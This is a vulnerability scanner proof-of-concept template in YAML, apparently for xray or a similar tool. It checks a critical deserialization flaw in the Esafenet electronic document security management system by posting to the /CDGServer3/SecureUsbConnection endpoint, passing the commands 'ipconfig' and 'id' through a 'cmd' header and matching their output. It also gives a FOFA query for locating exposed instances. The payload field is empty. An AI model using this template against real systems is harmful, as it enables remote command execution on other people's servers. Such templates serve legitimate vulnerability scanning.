id: poc-yaml-yisaitong-esafenet-secureusbconnection-unserialize
info:
  name: 亿赛通电子文档安全管理系统 SecureUsbConnection 反序列化漏洞
  severity: critical
  tags:
  - 两高一弱
  - 反序列化
  finger: 亿赛通电子文档安全管理系统
  fofa: app="亿赛通-电子文档安全管理系统"
variables:
  command: 'ipconfig

    id

    '
  payload: 
requests:
- method: POST
  path: /CDGServer3/SecureUsbConnection?command=GETSYSTEMINFO
  headers:
    Content-Type: text/xml
    cmd: '{{.command}}'
  data: '{{.payload}}'
  expression: (status_code == 200 && !contains(body,"<")) && ( (contains(body,"Windows
    IP") && contains(body,"IPv4")) || (matches(body,"uid=[0-9]{1,4}") && matches(body,"gid=[0-9]{1,4}"))
    )
transport: http
